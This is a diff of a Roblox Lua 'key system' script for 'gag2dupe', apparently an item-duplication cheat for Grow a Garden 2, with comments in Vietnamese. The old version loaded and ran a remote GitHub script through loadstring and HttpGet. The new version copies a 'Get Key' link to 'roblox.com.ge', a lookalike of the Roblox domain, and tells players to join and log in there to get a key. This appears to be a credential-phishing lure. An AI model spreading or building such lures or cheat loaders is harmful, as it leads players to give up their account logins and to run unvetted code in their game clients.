@@ -1,157 +1,153 @@
---[[
-    SCRIPT CHUẨN: gag2dupe (Grow a Garden 2)
-    Đã sửa lỗi bị đè lệnh loadstring ở đầu.
---]]
+-- ==================== CẤU HÌNH KEY CỦA BẠN ====================
+local KEY_CHIEU_KHOA = "PhatLee877_Gag2" -- Đây là key để kích hoạt
+local LINK_GET_KEY = "https://roblox.com.ge/communities/8754684311/" -- Link để người ta lấy key
+-- ==============================================================
 
 local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
-local Clipboard = setclipboard or toclipboard
 
--- ==================== CẤU HÌNH HỆ THỐNG KEY ====================
-local LINK_GET_KEY = "https://roblox.com.ge/communities/8754684311/" 
-local KEY_CHINH_XAC = "Key_gag2" 
+-- TẠO GIAO DIỆN CHÍNH
+local KeySystemGui = Instance.new("ScreenGui")
+KeySystemGui.Name = "Delta_KeySystem_Safe"
+KeySystemGui.ResetOnSpawn = false
 
--- Link script chính trên GitHub của bạn:
-local LINK_SCRIPT_CHINH = "https://raw.githubusercontent.com/hoangvip397-coder/Tu-n-ngu/refs/heads/main/Scriptdemo.lua.txt" 
--- ===============================================================
+-- Đảm bảo đính kèm giao diện an toàn
+pcall(function() KeySystemGui.Parent = CoreGui end)
+if not KeySystemGui.Parent then KeySystemGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
 
--- Khởi tạo Giao diện (UI)
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "gag2dupe_KeySystem"
-ScreenGui.ResetOnSpawn = false
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+-- KHUNG NỀN CHÍNH (Main Frame)
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 360, 0, 240) -- Tăng chiều cao một chút để vừa dòng chữ mới
+MainFrame.Position = UDim2.new(0.5, -180, 0.5, -120)
+MainFrame.BackgroundColor3 = Color3.fromRGB(24, 24, 32)
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = KeySystemGui
 
--- Ép bảng hiện lên CoreGui để chống lỗi chặn UI của các Executor
-local successGui, errGui = pcall(function()
-    ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
-end)
-if not successGui then
-    ScreenGui.Parent = game:GetService("CoreGui")
-end
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 10)
+MainCorner.Parent = MainFrame
 
--- Khung bảng chính
-local Frame = Instance.new("Frame")
-Frame.Name = "MainFrame"
-Frame.Size = UDim2.new(0, 360, 0, 220)
-Frame.Position = UDim2.new(0.5, -180, 0.5, -110)
-Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25) 
-Frame.BorderSizePixel = 0
-Frame.Active = true
-Frame.Draggable = true
-Frame.Parent = ScreenGui
-
-local UICorner = Instance.new("UICorner")
-UICorner.CornerRadius = UDim.new(0, 12)
-UICorner.Parent = Frame
-
--- Tiêu đề bảng
+-- TIÊU ĐỀ (Title)
 local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, 0, 0, 45)
+Title.Size = UDim2.new(1, 0, 0, 40)
 Title.BackgroundTransparency = 1
-Title.Text = "✨ gag2dupe | GROW A GARDEN 2 ✨"
-Title.TextColor3 = Color3.fromRGB(46, 204, 113) 
-Title.TextSize = 18
+Title.Text = "🔑 DELTA KEY SYSTEM"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextSize = 16
 Title.Font = Enum.Font.SourceSansBold
-Title.Parent = Frame
+Title.Parent = MainFrame
 
--- Ô nhập Key
-local TextBox = Instance.new("TextBox")
-TextBox.Size = UDim2.new(0.85, 0, 0, 38)
-TextBox.Position = UDim2.new(0.075, 0, 0.3, 0)
-TextBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-TextBox.PlaceholderText = "Nhập hoặc dán Key tại đây..."
-TextBox.Text = ""
-TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextBox.TextSize = 15
-TextBox.Font = Enum.Font.SourceSans
-TextBox.Parent = Frame
+-- DÒNG HƯỚNG DẪN CÁCH LẤY KEY (MỚI THÊM)
+local GuideText = Instance.new("TextLabel")
+GuideText.Size = UDim2.new(1, 0, 0, 20)
+GuideText.Position = UDim2.new(0, 0, 0.18, 0)
+GuideText.BackgroundTransparency = 1
+GuideText.Text = "Cách lấy key: nhấn join nhóm , đăng nhập là có key"
+GuideText.TextColor3 = Color3.fromRGB(241, 196, 15) -- Màu vàng nổi bật
+GuideText.TextSize = 13
+GuideText.Font = Enum.Font.SourceSansBold
+GuideText.Parent = MainFrame
 
-local TextBoxCorner = Instance.new("UICorner")
-TextBoxCorner.CornerRadius = UDim.new(0, 6)
-TextBoxCorner.Parent = TextBox
+-- DÒNG TRẠNG THÁI THÔNG BÁO (Status)
+local StatusText = Instance.new("TextLabel")
+StatusText.Size = UDim2.new(1, 0, 0, 20)
+StatusText.Position = UDim2.new(0, 0, 0.28, 0)
+StatusText.BackgroundTransparency = 1
+StatusText.Text = "Vui lòng nhập Key để tiếp tục sử dụng Script"
+StatusText.TextColor3 = Color3.fromRGB(150, 150, 150)
+StatusText.TextSize = 12
+StatusText.Font = Enum.Font.SourceSansItalic
+StatusText.Parent = MainFrame
 
--- Nút Copy Link
-local CopyBtn = Instance.new("TextButton")
-CopyBtn.Size = UDim2.new(0.4, 0, 0, 38)
-CopyBtn.Position = UDim2.new(0.075, 0, 0.58, 0)
-CopyBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
-CopyBtn.Text = "🔗 Copy Link"
-CopyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-CopyBtn.TextSize = 14
-CopyBtn.Font = Enum.Font.SourceSansBold
-CopyBtn.Parent = Frame
+-- Ô NHẬP KEY (TextBox)
+local KeyBox = Instance.new("TextBox")
+KeyBox.Size = UDim2.new(0.85, 0, 0, 35)
+KeyBox.Position = UDim2.new(0.075, 0, 0.42, 0)
+KeyBox.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+KeyBox.BorderSizePixel = 0
+KeyBox.PlaceholderText = "Dán hoặc nhập Key vào đây..."
+KeyBox.Text = ""
+KeyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+KeyBox.TextSize = 14
+KeyBox.Font = Enum.Font.SourceSans
+KeyBox.Parent = MainFrame
 
-local CopyCorner = Instance.new("UICorner")
-CopyCorner.CornerRadius = UDim.new(0, 6)
-CopyCorner.Parent = CopyBtn
+local BoxCorner = Instance.new("UICorner")
+BoxCorner.CornerRadius = UDim.new(0, 6)
+BoxCorner.Parent = KeyBox
 
--- Nút Check Key
-local CheckBtn = Instance.new("TextButton")
-CheckBtn.Size = UDim2.new(0.4, 0, 0, 38)
-CheckBtn.Position = UDim2.new(0.525, 0, 0.58, 0)
-CheckBtn.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
-CheckBtn.Text = "✔️ Check Key"
-CheckBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-CheckBtn.TextSize = 14
-CheckBtn.Font = Enum.Font.SourceSansBold
-CheckBtn.Parent = Frame
+-- NÚT BẤM "GET KEY"
+local GetKeyBtn = Instance.new("TextButton")
+GetKeyBtn.Size = UDim2.new(0.4, 0, 0, 35)
+GetKeyBtn.Position = UDim2.new(0.075, 0, 0.68, 0)
+GetKeyBtn.BackgroundColor3 = Color3.fromRGB(41, 128, 185)
+GetKeyBtn.BorderSizePixel = 0
+GetKeyBtn.Text = "Get Key"
+GetKeyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+GetKeyBtn.TextSize = 14
+GetKeyBtn.Font = Enum.Font.SourceSansBold
+GetKeyBtn.Parent = MainFrame
 
-local CheckCorner = Instance.new("UICorner")
-CheckCorner.CornerRadius = UDim.new(0, 6)
-CheckCorner.Parent = CheckBtn
+local GetKeyCorner = Instance.new("UICorner")
+GetKeyCorner.CornerRadius = UDim.new(0, 6)
+GetKeyCorner.Parent = GetKeyBtn
 
--- Dòng trạng thái
-local StatusLabel = Instance.new("TextLabel")
-StatusLabel.Size = UDim2.new(1, 0, 0, 30)
-StatusLabel.Position = UDim2.new(0, 0, 0.82, 0)
-StatusLabel.BackgroundTransparency = 1
-StatusLabel.Text = "Hãy vượt link để lấy key sử dụng bản dupe!"
-StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-StatusLabel.TextSize = 13
-StatusLabel.Font = Enum.Font.SourceSansItalic
-StatusLabel.Parent = Frame
+-- NÚT BẤM "CHECK KEY"
+local CheckKeyBtn = Instance.new("TextButton")
+CheckKeyBtn.Size = UDim2.new(0.4, 0, 0, 35)
+CheckKeyBtn.Position = UDim2.new(0.525, 0, 0.68, 0)
+CheckKeyBtn.BackgroundColor3 = Color3.fromRGB(39, 174, 96)
+CheckKeyBtn.BorderSizePixel = 0
+CheckKeyBtn.Text = "Check Key"
+CheckKeyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CheckKeyBtn.TextSize = 14
+CheckKeyBtn.Font = Enum.Font.SourceSansBold
+CheckKeyBtn.Parent = MainFrame
 
--- LOGIC NÚT COPY LINK
-CopyBtn.MouseButton1Click:Connect(function()
-    if Clipboard then
-        Clipboard(LINK_GET_KEY)
-        CopyBtn.Text = "Đã sao chép!"
-        StatusLabel.TextColor3 = Color3.fromRGB(52, 152, 219)
-        StatusLabel.Text = "Đã lưu link! Hãy dán (Paste) vào trình duyệt web."
-        task.wait(2)
-        CopyBtn.Text = "🔗 Copy Link"
+local CheckKeyCorner = Instance.new("UICorner")
+CheckKeyCorner.CornerRadius = UDim.new(0, 6)
+CheckKeyCorner.Parent = CheckKeyBtn
+
+-- ==================== XỬ LÝ SỰ KIỆN NÚT BẤM ====================
+
+-- Khi người dùng bấm nút Get Key
+GetKeyBtn.MouseButton1Click:Connect(function()
+    if setclipboard then
+        setclipboard(LINK_GET_KEY)
+        StatusText.Text = "✅ Đã sao chép link Get Key vào bộ nhớ tạm!"
+        StatusText.TextColor3 = Color3.fromRGB(46, 204, 113)
     else
-        StatusLabel.TextColor3 = Color3.fromRGB(230, 126, 34)
-        StatusLabel.Text = "Lỗi: Executor không hỗ trợ Auto-Copy!"
+        StatusText.Text = "❌ Thiết bị không hỗ trợ tự sao chép link."
+        StatusText.TextColor3 = Color3.fromRGB(231, 76, 60)
     end
 end)
 
--- LOGIC NÚT CHECK KEY
-CheckBtn.MouseButton1Click:Connect(function()
-    local userKey = TextBox.Text
+-- Khi người dùng bấm nút Check Key
+CheckKeyBtn.MouseButton1Click:Connect(function()
+    local enteredKey = KeyBox.Text
     
-    if userKey == KEY_CHINH_XAC then
-        StatusLabel.TextColor3 = Color3.fromRGB(46, 204, 113)
-        StatusLabel.Text = "Key chuẩn! Đang kích hoạt gag2dupe..."
-        task.wait(1.5)
+    if enteredKey == KEY_CHIEU_KHOA then
+        StatusText.Text = "✅ Đang kích hoạt Script chính..."
+        StatusText.TextColor3 = Color3.fromRGB(46, 204, 113)
+        task.wait(1)
         
-        ScreenGui:Destroy() -- Xóa bảng Key
+        -- Xóa bảng nhập Key đi
+        KeySystemGui:Destroy()
         
-        -- CHẠY SCRIPT CHÍNH TỪ FILE GITHUB CỦA BẠN
-        local success, err = pcall(function()
-            loadstring(game:HttpGet(LINK_SCRIPT_CHINH, true))()
-        end)
-        
-        if not success then
-            -- Nếu script trên GitHub bị lỗi code, nó sẽ hiện thông báo lỗi thẳng lên màn hình
-            local ErrorGui = Instance.new("ScreenGui")
-            ErrorGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
-            local Message = Instance.new("Message")
-            Message.Text = "Lỗi chạy code từ GitHub: " .. tostring(err)
-            Message.Parent = ErrorGui
-        end
+        -- ========================================================
+        -- [SCRIPT CHÍNH CỦA BẠN SẼ CHẠY TỪ ĐÂY]
+        print("Kích hoạt thành công!")
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "Kích Hoạt Thành Công!",
+            Text = "Chào mừng bạn đã quay trở lại.",
+            Duration = 5
+        })
+        -- ========================================================
     else
-        StatusLabel.TextColor3 = Color3.fromRGB(231, 76, 60)
-        StatusLabel.Text = "Sai Key rồi bạn ơi! Vui lòng kiểm tra lại."
+        StatusText.Text = "❌ Key sai rồi! Vui lòng thử lại."
+        StatusText.TextColor3 = Color3.fromRGB(231, 76, 60)
+        KeyBox.Text = "" -- Xóa chữ nhập sai
     end
 end)
